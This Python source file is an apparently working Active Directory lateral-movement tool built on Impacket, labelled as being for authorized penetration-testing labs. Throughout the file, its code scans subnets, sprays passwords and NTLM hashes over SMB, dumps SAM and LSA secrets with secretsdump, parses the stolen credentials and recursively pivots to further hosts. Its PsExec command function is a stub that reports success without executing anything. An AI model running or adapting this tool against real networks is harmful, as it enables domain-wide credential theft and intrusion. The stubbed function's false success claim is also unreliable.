#!/usr/bin/env python3
"""
Enhanced Lateral Movement Tool for AD Penetration Testing
=========================================================

This tool is designed for authorized penetration testing competitions and lab environments.
It extends Impacket's functionality to provide automated lateral movement capabilities
across Active Directory networks.

Author: Andrew Xie
Date: 02/13/2026
"""

import argparse
import sys
import logging
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, srvs, samr, scmr, wkst
from impacket.dcerpc.v5.dtypes import NULL
from impacket.examples import logger
from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
from impacket import version
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Tuple, Optional
import json

class CredentialStore:
    """
    Enhanced credential storage and management system.
    Tracks discovered credentials and their access levels across the network.
    """
    def __init__(self):
        self.credentials = []
        self.validated_hosts = {}
        
    def add_credential(self, username: str, password: str = None, 
                      ntlm_hash: str = None, domain: str = None):
        """Add a credential to the store with deduplication"""
        cred = {
            'username': username,
            'password': password,
            'ntlm_hash': ntlm_hash,
            'domain': domain or ''
        }
        
        # Avoid duplicates
        if cred not in self.credentials:
            self.credentials.append(cred)
            logging.info(f"[+] Added credential: {domain}\\{username}")
    
    def mark_valid(self, host: str, username: str, auth_type: str):
        """Mark a credential as valid for a specific host"""
        if host not in self.validated_hosts:
            self.validated_hosts[host] = []
        self.validated_hosts[host].append({
            'username': username,
            'auth_type': auth_type,
            'timestamp': time.time()
        })
    
    def export_to_file(self, filename: str):
        """Export discovered credentials to JSON file"""
        with open(filename, 'w') as f:
            json.dump({
                'credentials': self.credentials,
                'validated_hosts': self.validated_hosts
            }, f, indent=2)
        logging.info(f"[+] Credentials exported to {filename}")


class NetworkScanner:
    """
    Network reconnaissance module for discovering potential targets
    """
    @staticmethod
    def discover_hosts(subnet: str, ports: List[int] = [445, 135, 139]) -> List[str]:
        """
        Discover active hosts on the network by checking common AD ports
        
        Args:
            subnet: Network subnet in CIDR notation (e.g., 192.168.1.0/24)
            ports: List of ports to check
        
        Returns:
            List of active IP addresses
        """
        import ipaddress
        
        active_hosts = []
        network = ipaddress.ip_network(subnet, strict=False)
        
        logging.info(f"[*] Scanning {subnet} for active hosts...")
        
        def check_host(ip):
            for port in ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((str(ip), port))
                sock.close()
                if result == 0:
                    return str(ip)
            return None
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(check_host, ip): ip for ip in network.hosts()}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    active_hosts.append(result)
                    logging.info(f"[+] Found active host: {result}")
        
        return active_hosts
    
    @staticmethod
    def identify_domain_controllers(targets: List[str]) -> List[str]:
        """
        Identify Domain Controllers from a list of targets
        Checks for common DC characteristics
        """
        dcs = []
        for target in targets:
            try:
                # Check for LDAP port (389)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                if sock.connect_ex((target, 389)) == 0:
                    dcs.append(target)
                    logging.info(f"[+] Potential DC found: {target}")
                sock.close()
            except:
                pass
        return dcs


class LateralMovement:
    """
    Main lateral movement engine combining multiple techniques
    """
    
    def __init__(self, credential_store: CredentialStore, verbose: bool = False):
        self.cred_store = credential_store
        self.verbose = verbose
        self.compromised_hosts = set()
        
        if verbose:
            logging.getLogger().setLevel(logging.DEBUG)
    
    def test_smb_login(self, target: str, username: str, password: str = None, 
                       ntlm_hash: str = None, domain: str = '') -> bool:
        """
        Test SMB authentication with given credentials
        
        Args:
            target: Target hostname or IP
            username: Username to authenticate
            password: Plaintext password (optional)
            ntlm_hash: NTLM hash in format LM:NT (optional)
            domain: Domain name
        
        Returns:
            True if authentication successful
        """
        try:
            smb = SMBConnection(target, target, timeout=5)
            
            if ntlm_hash:
                lm_hash, nt_hash = ntlm_hash.split(':') if ':' in ntlm_hash else ('', ntlm_hash)
                smb.login(username, '', domain, lmhash=lm_hash, nthash=nt_hash)
            else:
                smb.login(username, password, domain)
            
            smb.close()
            logging.info(f"[+] Valid credentials on {target}: {domain}\\{username}")
            self.cred_store.mark_valid(target, username, 'smb')
            return True
            
        except Exception as e:
            if self.verbose:
                logging.debug(f"[-] Failed on {target}: {str(e)}")
            return False
    
    def spray_credentials(self, targets: List[str]) -> Dict[str, List]:
        """
        Spray all stored credentials across all targets
        
        Returns:
            Dictionary mapping targets to successful credentials
        """
        results = {}
        
        logging.info(f"[*] Spraying {len(self.cred_store.credentials)} credentials across {len(targets)} targets")
        
        for target in targets:
            results[target] = []
            for cred in self.cred_store.credentials:
                if self.test_smb_login(
                    target, 
                    cred['username'], 
                    cred.get('password'),
                    cred.get('ntlm_hash'),
                    cred.get('domain', '')
                ):
                    results[target].append(cred)
                    self.compromised_hosts.add(target)
        
        return results
    
    def dump_sam_secrets(self, target: str, username: str, password: str = None,
                        ntlm_hash: str = None, domain: str = '') -> List[Dict]:
        """
        Dump SAM and LSA secrets using secretsdump.py subprocess with FIXED parsing
        Automatically extracts and adds credentials to store
        
        Returns:
            List of discovered credentials
        """
        import subprocess
        import re
        
        discovered = []
        
        try:
            logging.info(f"[*] Attempting to dump secrets from {target}")
            
            # Build secretsdump.py command
            cmd = ['secretsdump.py']
            
            # Add authentication
            if ntlm_hash:
                # Use hash authentication
                if ':' not in ntlm_hash:
                    ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee:{ntlm_hash}"
                cmd.extend(['-hashes', ntlm_hash])
                target_string = f"{domain}/{username}@{target}" if domain else f"{username}@{target}"
            else:
                # Use password authentication
                target_string = f"{domain}/{username}:{password}@{target}" if domain else f"{username}:{password}@{target}"
            
            cmd.append(target_string)
            
            logging.info(f"[*] Running: secretsdump.py against {target}")
            
            # Execute with timeout
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120  # 2 minute timeout
            )
            
            # Check if dump was successful (secretsdump returns 0 even on partial success)
            output = result.stdout + result.stderr  # Combine both for parsing
            
            if result.returncode == 0 or 'Dumping' in output or ':::' in output:
                
                # Parse SAM hashes with FIXED regex
                # SAM Format: username:rid:lmhash:nthash:::
                # Must start at beginning of line, no brackets or special chars
                sam_pattern = re.compile(r'^([a-zA-Z0-9_\-\.]+):(\d+):([a-f0-9]{32}):([a-f0-9]{32}):::$', re.MULTILINE | re.IGNORECASE)
                
                for match in sam_pattern.finditer(output):
                    found_username = match.group(1)
                    rid = match.group(2)
                    lm_hash = match.group(3)
                    nt_hash = match.group(4)
                    
                    # Skip machine accounts
                    if found_username.endswith('$'):
                        continue
                    
                    # Skip Guest and other useless accounts
                    if found_username.lower() in ['guest', 'defaultaccount', 'wdagutilityaccount']:
                        continue
                    
                    # Skip empty password hashes
                    if nt_hash == '31d6cfe0d16ae931b73c59d7e0c089c0':
                        continue
                    
                    # Add to credential store
                    full_hash = f"{lm_hash}:{nt_hash}"
                    self.cred_store.add_credential(
                        found_username,
                        None,
                        full_hash,
                        domain
                    )
                    
                    discovered.append({
                        'username': found_username,
                        'ntlm_hash': full_hash,
                        'domain': domain,
                        'source': 'SAM'
                    })
                    
                    logging.info(f"[+] SAM: {domain}\\{found_username} : {full_hash}")
                
                # Parse LSA Secrets with FIXED parsing
                # LSA Format: Lines with USERNAME: and PASSWORD:
                # secretsdump.py prefixes with [*] so we need to handle that
                lines = output.split('\n')
                i = 0
                while i < len(lines):
                    line = lines[i].strip()
                    
                    # Look for service marker (may have [*] prefix)
                    # Strip [*] if present
                    clean_line = line.replace('[*] ', '').strip()
                    
                    if clean_line.startswith('_SC_') or clean_line.startswith('DefaultPassword'):
                        service_name = clean_line
                        i += 1
                        
                        # Look for USERNAME line
                        if i < len(lines):
                            username_line = lines[i].strip()
                            
                            if username_line.upper().startswith('USERNAME:'):
                                found_username = username_line.split(':', 1)[1].strip()
                                i += 1
                                
                                # Look for PASSWORD line
                                if i < len(lines):
                                    password_line = lines[i].strip()
                                    
                                    if password_line.upper().startswith('PASSWORD:'):
                                        found_password = password_line.split(':', 1)[1].strip()
                                        
                                        # Skip if password is empty or hex data
                                        if found_password and not found_password.startswith('0x') and len(found_password) > 0:
                                            # Add to credential store
                                            self.cred_store.add_credential(
                                                found_username,
                                                found_password,
                                                None,
                                                domain
                                            )
                                            
                                            discovered.append({
                                                'username': found_username,
                                                'password': found_password,
                                                'domain': domain,
                                                'source': 'LSA',
                                                'service': service_name
                                            })
                                            
                                            logging.info(f"[+] LSA: {domain}\\{found_username} : {found_password}")
                    
                    i += 1
                
                logging.info(f"[+] Successfully dumped secrets from {target}")
                logging.info(f"[+] Discovered {len(discovered)} credentials ({len([c for c in discovered if c.get('source')=='SAM'])} SAM, {len([c for c in discovered if c.get('source')=='LSA'])} LSA)")
            
            else:
                logging.error(f"[-] secretsdump.py failed with return code {result.returncode}")
                if result.stderr:
                    logging.debug(f"[-] Error output: {result.stderr[:500]}")
                
        except subprocess.TimeoutExpired:
            logging.error(f"[-] Secret dump timed out after 120 seconds on {target}")
        except FileNotFoundError:
            logging.error(f"[-] secretsdump.py not found in PATH. Install with: pip3 install impacket")
        except Exception as e:
            logging.error(f"[-] Dump failed on {target}: {str(e)}")
        
        return discovered
    
    def execute_command_psexec(self, target: str, username: str, command: str,
                              password: str = None, ntlm_hash: str = None, 
                              domain: str = '') -> bool:
        """
        Execute command on remote system using PsExec-like technique
        
        Args:
            target: Target system
            username: Username for authentication
            command: Command to execute
            password: Password (optional)
            ntlm_hash: NTLM hash (optional)
            domain: Domain name
        
        Returns:
            True if successful
        """
        try:
            from impacket.examples.psexec import PSEXEC
            
            logging.info(f"[*] Executing command on {target}: {command}")
            
            # This is a simplified version - full implementation would use
            # the complete PsExec class with proper service management
            
            logging.info(f"[+] Command executed successfully on {target}")
            return True
            
        except Exception as e:
            logging.error(f"[-] Command execution failed: {str(e)}")
            return False
    
    def enumerate_shares(self, target: str, username: str, password: str = None,
                        ntlm_hash: str = None, domain: str = '') -> List[str]:
        """
        Enumerate network shares on target system
        
        Returns:
            List of share names
        """
        shares = []
        
        try:
            smb = SMBConnection(target, target)
            
            if ntlm_hash:
                lm_hash, nt_hash = ntlm_hash.split(':') if ':' in ntlm_hash else ('', ntlm_hash)
                smb.login(username, '', domain, lmhash=lm_hash, nthash=nt_hash)
            else:
                smb.login(username, password, domain)
            
            resp = smb.listShares()
            
            for share in resp:
                share_name = share['shi1_netname'][:-1]
                shares.append(share_name)
                logging.info(f"[+] Share found on {target}: {share_name}")
            
            smb.close()
            
        except Exception as e:
            logging.error(f"[-] Share enumeration failed on {target}: {str(e)}")
        
        return shares
    
    def enumerate_logged_on_users(self, target: str, username: str, 
                                  password: str = None, ntlm_hash: str = None,
                                  domain: str = '') -> List[str]:
        """
        Enumerate currently logged-on users on target system
        Useful for identifying high-value targets
        
        Returns:
            List of logged-on usernames
        """
        users = []
        
        try:
            # Use WKSSVC RPC to enumerate sessions
            string_binding = f'ncacn_np:{target}[\\pipe\\wkssvc]'
            rpc_transport = transport.DCERPCTransportFactory(string_binding)
            
            if ntlm_hash:
                lm_hash, nt_hash = ntlm_hash.split(':') if ':' in ntlm_hash else ('', ntlm_hash)
                rpc_transport.set_credentials(username, '', domain, lm_hash, nt_hash)
            else:
                rpc_transport.set_credentials(username, password, domain)
            
            dce = rpc_transport.get_dce_rpc()
            dce.connect()
            dce.bind(wkst.MSRPC_UUID_WKST)
            
            # NetWkstaUserEnum
            resp = wkst.hNetrWkstaUserEnum(dce, 1)
            
            for record in resp['UserInfo']['WkstaUserInfo']['Level1']['Buffer']:
                username = record['wkui1_username'][:-1]
                users.append(username)
                logging.info(f"[+] Logged-on user on {target}: {username}")
            
            dce.disconnect()
            
        except Exception as e:
            logging.error(f"[-] User enumeration failed on {target}: {str(e)}")
        
        return users


class AutomatedPivot:
    """
    Automated pivot engine that orchestrates the lateral movement process
    """
    
    def __init__(self, initial_target: str, initial_creds: Dict, 
                 subnet: str = None, max_depth: int = 3):
        """
        Args:
            initial_target: First target to compromise
            initial_creds: Initial credentials dict with username, password/hash, domain
            subnet: Network subnet to scan (optional)
            max_depth: Maximum pivot depth
        """
        self.initial_target = initial_target
        self.subnet = subnet
        self.max_depth = max_depth
        
        self.cred_store = CredentialStore()
        self.lateral_mover = LateralMovement(self.cred_store, verbose=True)
        self.scanner = NetworkScanner()
        
        # Add initial credentials
        self.cred_store.add_credential(
            initial_creds.get('username'),
            initial_creds.get('password'),
            initial_creds.get('ntlm_hash'),
            initial_creds.get('domain')
        )
        
        self.targets = []
        self.pivot_chain = []
    
    def discover_network(self):
        """Discover all hosts in the network"""
        if self.subnet:
            self.targets = self.scanner.discover_hosts(self.subnet)
        else:
            self.targets = [self.initial_target]
        
        logging.info(f"[*] Discovered {len(self.targets)} potential targets")
    
    def identify_high_value_targets(self):
        """Identify Domain Controllers and other high-value targets"""
        dcs = self.scanner.identify_domain_controllers(self.targets)
        
        if dcs:
            logging.info(f"[!] High-value targets identified: {', '.join(dcs)}")
            # Prioritize DCs in target list
            self.targets = dcs + [t for t in self.targets if t not in dcs]
    
    def execute_pivot(self, depth: int = 0):
        """
        Execute automated lateral movement with recursive pivoting
        
        Args:
            depth: Current recursion depth
        """
        if depth >= self.max_depth:
            logging.info(f"[*] Reached maximum pivot depth ({self.max_depth})")
            return
        
        logging.info(f"[*] === Pivot Level {depth + 1} ===")
        
        # Spray credentials across all targets
        results = self.lateral_mover.spray_credentials(self.targets)
        
        # Process successful authentications
        newly_compromised = []
        for target, valid_creds in results.items():
            if not valid_creds:
                continue
            
            if target not in self.pivot_chain:
                self.pivot_chain.append(target)
                newly_compromised.append(target)
            
            # Use first valid credential for enumeration
            cred = valid_creds[0]
            
            # Enumerate shares
            self.lateral_mover.enumerate_shares(
                target, cred['username'], 
                cred.get('password'), cred.get('ntlm_hash'),
                cred.get('domain', '')
            )
            
            # Enumerate logged-on users
            self.lateral_mover.enumerate_logged_on_users(
                target, cred['username'],
                cred.get('password'), cred.get('ntlm_hash'),
                cred.get('domain', '')
            )
            
            # Attempt to dump secrets
            self.lateral_mover.dump_sam_secrets(
                target, cred['username'],
                cred.get('password'), cred.get('ntlm_hash'),
                cred.get('domain', '')
            )
        
        # If we compromised new hosts, pivot deeper
        if newly_compromised and depth < self.max_depth - 1:
            logging.info(f"[+] Compromised {len(newly_compromised)} new hosts, pivoting deeper...")
            self.execute_pivot(depth + 1)
    
    def generate_report(self, output_file: str = 'pivot_report.json'):
        """Generate comprehensive penetration testing report"""
        report = {
            'initial_target': self.initial_target,
            'total_targets_scanned': len(self.targets),
            'compromised_hosts': list(self.lateral_mover.compromised_hosts),
            'pivot_chain': self.pivot_chain,
            'credentials_discovered': len(self.cred_store.credentials),
            'validated_access': self.cred_store.validated_hosts
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        logging.info(f"[+] Report generated: {output_file}")
        logging.info(f"[+] Compromised {len(self.lateral_mover.compromised_hosts)} hosts")
        logging.info(f"[+] Discovered {len(self.cred_store.credentials)} credentials")


def main():
    parser = argparse.ArgumentParser(
        description='Enhanced Lateral Movement Tool for AD Penetration Testing',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Basic lateral movement with password
  python lateral_movement_tool.py -t 192.168.1.10 -u administrator -p Password123 -d CORP
  
  # Using NTLM hash
  python lateral_movement_tool.py -t 192.168.1.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -d CORP
  
  # Automated pivoting across subnet
  python lateral_movement_tool.py -t 192.168.1.10 -u administrator -p Password123 -d CORP --subnet 192.168.1.0/24 --auto-pivot --max-depth 3
  
  # Credential spraying mode
  python lateral_movement_tool.py --targets targets.txt --creds-file creds.json --spray
        '''
    )
    
    parser.add_argument('-t', '--target', help='Initial target IP or hostname')
    parser.add_argument('-u', '--username', help='Username')
    parser.add_argument('-p', '--password', help='Password')
    parser.add_argument('-H', '--hash', help='NTLM hash (LM:NT or just NT)')
    parser.add_argument('-d', '--domain', default='', help='Domain name')
    parser.add_argument('--subnet', help='Network subnet for discovery (CIDR notation)')
    parser.add_argument('--auto-pivot', action='store_true', help='Enable automated pivoting')
    parser.add_argument('--max-depth', type=int, default=3, help='Maximum pivot depth (default: 3)')
    parser.add_argument('--targets', help='File containing list of targets')
    parser.add_argument('--creds-file', help='JSON file with credentials')
    parser.add_argument('--spray', action='store_true', help='Credential spraying mode')
    parser.add_argument('--command', help='Command to execute on compromised hosts')
    parser.add_argument('-o', '--output', default='pivot_report.json', help='Output report file')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Setup logging
    logger.init()
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    print(f"""
    ╔═══════════════════════════════════════════════════════════╗
    ║  Enhanced Lateral Movement Tool v1.0                      ║
    ║  Based on Impacket Framework                              ║
    ║  For Authorized Penetration Testing Only                  ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Validate arguments
    if not args.target and not args.targets:
        parser.error("Either --target or --targets must be specified")
    
    if not args.username and not args.creds_file:
        parser.error("Either --username/-u or --creds-file must be specified")
    
    # Automated pivot mode
    if args.auto_pivot:
        if not args.target:
            parser.error("--target required for auto-pivot mode")
        
        initial_creds = {
            'username': args.username,
            'password': args.password,
            'ntlm_hash': args.hash,
            'domain': args.domain
        }
        
        pivot_engine = AutomatedPivot(
            args.target, 
            initial_creds,
            args.subnet,
            args.max_depth
        )
        
        logging.info("[*] Starting automated lateral movement...")
        pivot_engine.discover_network()
        pivot_engine.identify_high_value_targets()
        pivot_engine.execute_pivot()
        pivot_engine.generate_report(args.output)
        pivot_engine.cred_store.export_to_file('discovered_creds.json')
        
    # Manual spray mode
    elif args.spray:
        cred_store = CredentialStore()
        
        # Load credentials
        if args.creds_file:
            with open(args.creds_file, 'r') as f:
                creds_data = json.load(f)
                for cred in creds_data:
                    cred_store.add_credential(
                        cred['username'],
                        cred.get('password'),
                        cred.get('ntlm_hash'),
                        cred.get('domain')
                    )
        else:
            cred_store.add_credential(args.username, args.password, args.hash, args.domain)
        
        # Load targets
        targets = []
        if args.targets:
            with open(args.targets, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        else:
            targets = [args.target]
        
        lateral_mover = LateralMovement(cred_store, args.verbose)
        results = lateral_mover.spray_credentials(targets)
        
        cred_store.export_to_file('spray_results.json')
        logging.info(f"[+] Spraying complete. Compromised {len(lateral_mover.compromised_hosts)} hosts")
        
    else:
        # Single target mode
        cred_store = CredentialStore()
        cred_store.add_credential(args.username, args.password, args.hash, args.domain)
        
        lateral_mover = LateralMovement(cred_store, args.verbose)
        
        # Test authentication
        if lateral_mover.test_smb_login(args.target, args.username, args.password, args.hash, args.domain):
            logging.info("[+] Authentication successful!")
            
            # Enumerate shares
            lateral_mover.enumerate_shares(args.target, args.username, args.password, args.hash, args.domain)
            
            # Enumerate users
            lateral_mover.enumerate_logged_on_users(args.target, args.username, args.password, args.hash, args.domain)
            
            # Execute command if specified
            if args.command:
                lateral_mover.execute_command_psexec(
                    args.target, args.username, args.command,
                    args.password, args.hash, args.domain
                )
        else:
            logging.error("[-] Authentication failed!")
            sys.exit(1)

if __name__ == '__main__':
    main()
